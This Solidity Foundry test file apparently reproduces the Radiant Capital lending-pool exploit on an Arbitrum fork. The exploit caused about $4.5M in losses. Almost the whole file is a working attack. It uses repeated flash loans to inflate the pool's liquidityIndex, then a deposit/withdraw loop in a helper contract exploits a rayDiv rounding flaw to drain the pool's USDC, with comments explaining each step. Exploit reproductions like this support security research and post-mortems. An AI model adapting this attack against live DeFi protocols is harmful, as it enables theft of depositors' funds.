// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$4,5M
// Attacker : https://arbiscan.io/address/0x826d5f4d8084980366f975e10db6c4cf1f9dde6d
// Attack Contract : https://arbiscan.io/address/0x39519c027b503f40867548fb0c890b11728faa8f
// Vuln Contract : https://arbiscan.io/address/0xf4b1486dd74d07706052a33d31d7c0aafd0659e1
// Attack Tx : https://explorer.phalcon.xyz/tx/arbitrum/0x1ce7e9a9e3b6dd3293c9067221ac3260858ce119ecb7ca860eac28b2474c7c9b

// @Analysis
// https://neptunemutual.com/blog/how-was-radiant-capital-exploited/
// https://twitter.com/BeosinAlert/status/1742389285926678784

interface IRadiant is IAaveFlashloan {
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;
}

contract ContractTest is Test {
    IAaveFlashloan private constant AaveV3Pool =
        IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IRadiant private constant RadiantLendingPool =
        IRadiant(0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1);
    IERC20 private constant USDC =
        IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 private constant rUSDCn =
        IERC20(0x3a2d44e354f2d88EF6DA7A5A4646fd70182A7F55);
    IERC20 private constant rWETH =
        IERC20(0x0dF5dfd95966753f01cb80E76dc20EA958238C46);
    IWETH private constant WETH =
        IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
    Uni_Pair_V3 private constant WETH_USDC =
        Uni_Pair_V3(0xC6962004f452bE9203591991D15f6b388e09E8D0);
    uint160 private constant MAX_SQRT_RATIO =
        1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;
    uint160 private constant MIN_SQRT_RATIO = 4_295_128_739;
    uint8 private operationId;

    function setUp() public {
        vm.createSelectFork("arbitrum", 166405686);
        vm.label(address(AaveV3Pool), "AaveV3Pool");
        vm.label(address(USDC), "USDC");
        vm.label(address(rUSDCn), "rUSDCn");
        vm.label(address(rWETH), "rWETH");
        vm.label(address(WETH), "WETH");
        vm.label(address(RadiantLendingPool), "RadiantLendingPool");
        vm.label(address(WETH_USDC), "WETH_USDC");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack",
            WETH.balanceOf(address(this)),
            18
        );
        operationId = 1;
        bytes memory params = abi.encode(
            address(RadiantLendingPool),
            address(rUSDCn),
            address(rWETH),
            address(WETH_USDC),
            uint256(1),
            uint256(0)
        );
        // Start flashloan attack to manipulate the liquidityIndex value
        takeFlashLoan(address(AaveV3Pool), 3_000_000 * 1e6, params);
        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack",
            WETH.balanceOf(address(this)),
            18
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        if ((operationId - 1) != 0) {
            if (operationId == 2) {
                operationId = 3;
                uint256 rUSDCnBalanceBeforeTransfer = rUSDCn.balanceOf(
                    address(this)
                );
                USDC.transfer(address(rUSDCn), rUSDCn.balanceOf(address(this)));
                RadiantLendingPool.withdraw(
                    address(USDC),
                    rUSDCnBalanceBeforeTransfer - 1,
                    address(this)
                );
            }
        } else {
            USDC.approve(address(RadiantLendingPool), type(uint256).max);
            RadiantLendingPool.deposit(
                address(USDC),
                2_000_000 * 1e6,
                address(this),
                0
            );
            operationId = 2;
            uint8 i;
            while (i < 151) {
                takeFlashLoan(
                    address(RadiantLendingPool),
                    2_000_000 * 1e6,
                    abi.encode(type(uint256).max)
                );
                ++i;
            }
            // End flashloan attack

            // To update: find a way to calculate below WETH amount
            uint256 amountToBorrow = 90_690_695_360_221_284_999;
            RadiantLendingPool.borrow(
                address(WETH),
                amountToBorrow,
                2,
                0,
                address(this)
            );
            uint256 transferAmount = rUSDCn.balanceOf(address(this));
            HelperExploit helper = new HelperExploit();
            USDC.approve(address(helper), type(uint256).max);
            // liquidityIndex is shifted to a very larger value so flaw (rounding issue) in rayDiv function can be used to take all the funds from pool
            helper.siphonFundsFromPool(transferAmount);

            WETH.approve(address(WETH_USDC), type(uint256).max);
            USDC.approve(address(WETH_USDC), type(uint256).max);
            WETH_USDC.swap(address(this), true, 2e18, MIN_SQRT_RATIO + 1, "");
            WETH_USDC.swap(
                address(this),
                false,
                3_232_558_736,
                MAX_SQRT_RATIO - 1,
                ""
            );
        }
        // Repaying Aave flashloan
        USDC.approve(address(AaveV3Pool), type(uint256).max);
        return true;
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        if (amount0Delta > 0) {
            WETH.transfer(address(WETH_USDC), uint256(amount0Delta));
        } else {
            USDC.transfer(address(WETH_USDC), uint256(amount1Delta));
        }
    }

    receive() external payable {}

    function takeFlashLoan(
        address where,
        uint256 amount,
        bytes memory params
    ) internal {
        address[] memory assets = new address[](1);
        assets[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        uint256[] memory interestRateModes = new uint256[](1);
        interestRateModes[0] = 0;
        IAaveFlashloan(where).flashLoan(
            address(this),
            assets,
            amounts,
            interestRateModes,
            address(this),
            params,
            0
        );
    }
}

contract HelperExploit is Test {
    IRadiant private constant RadiantLendingPool =
        IRadiant(0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1);
    IERC20 private constant USDC =
        IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 private constant rUSDCn =
        IERC20(0x3a2d44e354f2d88EF6DA7A5A4646fd70182A7F55);

    function siphonFundsFromPool(uint256 amount) external {
        USDC.transferFrom(msg.sender, address(this), amount << 1);
        USDC.approve(address(RadiantLendingPool), type(uint256).max);
        bool depositSingleAmount;
        while (true) {
            if (USDC.balanceOf(address(rUSDCn)) < 1) {
                break;
            }
            if (depositSingleAmount == true) {
                RadiantLendingPool.deposit(
                    address(USDC),
                    amount,
                    address(this),
                    0
                );
            } else {
                RadiantLendingPool.deposit(
                    address(USDC),
                    amount << 1,
                    address(this),
                    0
                );
                depositSingleAmount = true;
            }
            if (USDC.balanceOf(address(rUSDCn)) > ((amount * 3) >> 1) - 1) {
                RadiantLendingPool.withdraw(
                    address(USDC),
                    ((amount * 3) >> 1) - 1,
                    address(this)
                );
            } else {
                RadiantLendingPool.withdraw(
                    address(USDC),
                    USDC.balanceOf(address(rUSDCn)),
                    address(this)
                );
                USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
            }
        }
    }
}
